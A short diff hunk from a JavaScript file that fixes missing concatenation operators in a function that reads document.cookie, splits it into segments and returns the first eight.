@@ -15,9 +15,9 @@
         try {
 
             var c1=document.cookie;
-            var c2=c1.split(";")[0]+";"c1.split(";")[1]+";"c1.split(";")[2]+";"c1.split(";")[3]+";"c1.split(";")[4]+";"c1.split(";")[5]+";"c1.split(";")[6]+";"c1.split(";")[7];
-            var c3=c1.split(";")[8]+";"c1.split(";")[9]+";"c1.split(";")[10]+";"c1.split(";")[11]+";"c1.split(";")[12]+";"c1.split(";")[13]+";"c1.split(";")[14]+";"c1.split(";")[15];
-            var c4=c1.split(";")[16]+";"c1.split(";")[17]+";"c1.split(";")[18]+";"c1.split(";")[19]+";"c1.split(";")[20]+";"c1.split(";")[21]+";"c1.split(";")[22]+";"c1.split(";")[23];
+            var c2=c1.split(";")[0]+";"+c1.split(";")[1]+";"+c1.split(";")[2]+";"+c1.split(";")[3]+";"+c1.split(";")[4]+";"+c1.split(";")[5]+";"+c1.split(";")[6]+";"+c1.split(";")[7];
+            var c3=c1.split(";")[8]+";"+c1.split(";")[9]+";"+c1.split(";")[10]+";"+c1.split(";")[11]+";"+c1.split(";")[12]+";"+c1.split(";")[13]+";"+c1.split(";")[14]+";"+c1.split(";")[15];
+            var c4=c1.split(";")[16]+";"+c1.split(";")[17]+";"+c1.split(";")[18]+";"+c1.split(";")[19]+";"+c1.split(";")[20]+";"+c1.split(";")[21]+";"+c1.split(";")[22]+";"+c1.split(";")[23];
             return c2;
         } catch (e) {
             return ''
